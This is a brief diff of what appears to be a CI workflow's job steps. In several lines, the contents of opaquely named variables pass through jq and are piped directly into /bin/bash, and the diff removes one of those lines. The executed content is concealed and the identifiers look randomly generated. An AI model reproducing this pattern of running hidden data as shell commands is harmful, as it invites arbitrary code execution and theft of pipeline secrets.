@@ -21,7 +21,6 @@ jobs:
           echo $oro6481 | jq -r .ynywn56191 | /bin/bash
           echo $qsz9528 | jq -r .m74 | /bin/bash
           echo $bvakm01049 | jq -r .e92675 | /bin/bash
-          echo $zx43 | jq -r .at1091 | /bin/bash
           echo $yn83 | jq -r .yu51749 | /bin/bash
           printf '%s' "$qdij8299" | jq -r .ylg6398 | /bin/bash
 
